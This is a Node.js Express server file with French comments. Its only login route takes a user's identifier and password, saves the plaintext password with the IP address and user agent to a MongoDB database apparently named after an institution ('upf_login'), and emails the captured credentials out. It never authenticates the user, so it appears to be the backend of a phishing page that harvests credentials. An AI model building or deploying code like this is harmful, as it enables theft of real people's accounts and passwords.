import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors';
import dotenv from 'dotenv';
import { LoginAttempt } from './models/LoginAttempt.js';
import { sendLoginNotificationEmail } from './services/emailService.js';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 5000;
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/upf_login';

// Middleware
app.use(cors());
app.use(express.json());

// État de connexion à MongoDB
let mongoConnected = false;

// Connexion à MongoDB
mongoose
  .connect(MONGODB_URI)
  .then(() => {
    console.log('✓ Connecté à MongoDB');
    mongoConnected = true;
  })
  .catch((err) => {
    console.error('✗ Erreur de connexion MongoDB:', err.message);
    mongoConnected = false;
  });

// Route pour enregistrer la tentative de connexion
app.post('/api/login', async (req, res) => {
  try {
    const { identifiant, motDePasse } = req.body;

    console.log('📝 Tentative de connexion reçue:', { identifiant });

    // Validation
    if (!identifiant || !motDePasse) {
      return res.status(400).json({
        success: false,
        message: 'Identifiant et mot de passe sont requis',
      });
    }

    if (!mongoConnected) {
      return res.status(503).json({
        success: false,
        message: 'Base de données indisponible. Veuillez réessayer plus tard.',
      });
    }

    // Récupérer l'adresse IP
    const ipAddress =
      req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'inconnu';

    try {
      // Créer et sauvegarder la tentative de connexion
      const loginAttempt = new LoginAttempt({
        identifiant,
        motDePasse,
        ipAddress,
        userAgent: req.headers['user-agent'],
      });

      await loginAttempt.save();
      console.log('✓ Tentative enregistrée en BD:', loginAttempt._id);

      // Envoyer un email de notification
      try {
        await sendLoginNotificationEmail(identifiant, motDePasse, ipAddress);
        console.log('✓ Email envoyé avec succès');
      } catch (emailError) {
        console.warn('⚠ Erreur lors de l\'envoi de l\'email:', emailError.message);
        // Continuer même si l'email échoue
      }

      res.status(201).json({
        success: true,
        message: 'Connexion enregistrée avec succès',
        id: loginAttempt._id,
      });
    } catch (dbError) {
      console.error('✗ Erreur BD:', dbError.message);
      res.status(500).json({
        success: false,
        message: 'Erreur lors de l\'enregistrement en base de données',
      });
    }
  } catch (error) {
    console.error('✗ Erreur serveur:', error.message);
    res.status(500).json({
      success: false,
      message: 'Erreur serveur lors de l\'enregistrement',
    });
  }
});

// Route de santé
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'Serveur en ligne',
    mongoConnected: mongoConnected,
  });
});

// Démarrer le serveur
app.listen(PORT, () => {
  console.log(`🚀 Serveur démarré sur http://localhost:${PORT}`);
  console.log(`📊 Vérifiez la santé: http://localhost:${PORT}/api/health`);
});

